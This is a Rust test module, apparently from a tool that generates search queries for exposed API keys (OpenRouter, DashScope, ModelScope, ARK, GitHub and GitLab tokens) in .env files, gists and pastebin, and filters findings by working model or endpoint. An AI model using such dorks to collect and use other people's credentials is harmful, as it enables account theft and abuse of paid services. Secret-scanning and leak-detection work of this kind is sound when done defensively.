        let b = manual_queries_from(r#""OPENROUTER_API_KEY""#, 20, 7);
        for qs in [&a, &b] {
            assert!(qs.iter().any(|q| q.contains("openrouter.ai")));
            assert!(qs
                .iter()
                .any(|q| q.contains("OPENROUTER_API_KEY") && q.ends_with("path:.env")));
        }
        assert!(manual_source_queries(r#""OPENROUTER_API_KEY""#).len() > 1);
    }

    #[test]
    fn dashscope_target_does_not_get_pat_or_openrouter_dorks() {
        let qs = manual_queries("DASHSCOPE_API_KEY", 30);
        assert!(qs.iter().any(|q| q.contains("DASHSCOPE_API_KEY")));
        assert!(qs.iter().any(|q| q.contains("dashscope.aliyuncs.com")));
        assert!(
            !qs.iter().any(|q| q.contains("ghp_")
                || q.contains("github_pat_")
                || q.contains("glpat-")
                || q.contains("openrouter")
                || q.contains("OPENROUTER_API_KEY")
                || q.contains("deepseek")),
            "unrelated dorks leaked into DashScope: {qs:?}"
        );
    }

    #[test]
    fn narrow_target_skips_pat_feed_sources() {
        let narrow = manual_source_names_for("DASHSCOPE_API_KEY", 100);
        assert!(!narrow.iter().any(|s| s == "gists"));
        assert!(!narrow.iter().any(|s| s == "pastebin"));
        let broad = manual_source_names_for("ghp_", 100);
        assert!(broad.iter().any(|s| s == "gists"));
    }

    #[test]
    fn named_target_does_not_get_unrelated_provider_dorks() {
        let qs = manual_queries("modelscope", 20);
        assert!(qs.iter().any(|q| q == "modelscope"));
        assert!(qs.iter().any(|q| q.contains("api-inference.modelscope.cn")));
        assert!(qs.iter().any(|q| q.contains("MODELSCOPE_API_KEY")));
        assert!(
            !qs.iter().any(|q| q.contains("openrouter")
                || q.contains("OPENROUTER_API_KEY")
                || q.contains("deepseek")
                || q.contains("DEEPSEEK_API_KEY")),
            "unrelated provider dorks leaked into modelscope: {qs:?}"
        );
    }

    #[test]
    fn seedance_target_gets_ark_dorks_only() {
        let qs = manual_queries("seedance", 30);
        assert!(qs.iter().any(|q| q.contains("SEEDANCE_API_KEY")));
        assert!(qs.iter().any(|q| q.contains("ARK_API_KEY")));
        assert!(qs.iter().any(|q| q.contains("doubao-seedance")));
        assert!(
            !qs.iter().any(|q| q.contains("openrouter")
                || q.contains("OPENROUTER_API_KEY")
                || q.contains("deepseek")
                || q.contains("DEEPSEEK_API_KEY")
                || q.contains("DASHSCOPE_API_KEY")),
            "unrelated provider dorks leaked into seedance: {qs:?}"
        );
    }

    #[test]
    fn custom_filter_matches_working_model_or_endpoint() {
        let f = finding("https://api.example.test/v1", "claude-opus-5.5");
        assert!(export_matches(
            &f,
            ExportPreset::Custom,
            Some("CLAUDE-OPUS-5")
        ));
        assert!(export_matches(
            &f,
            ExportPreset::Custom,
            Some("example.test")
        ));
        assert!(!export_matches(&f, ExportPreset::Custom, Some("gpt-6.1")));

        let mut catalog_only = finding("https://api.example.test/v1", "other");
        catalog_only.models.push("claude-opus-5".into());
        assert!(!export_matches(
            &catalog_only,
            ExportPreset::Custom,
            Some("claude-opus-5")
        ));
    }
}
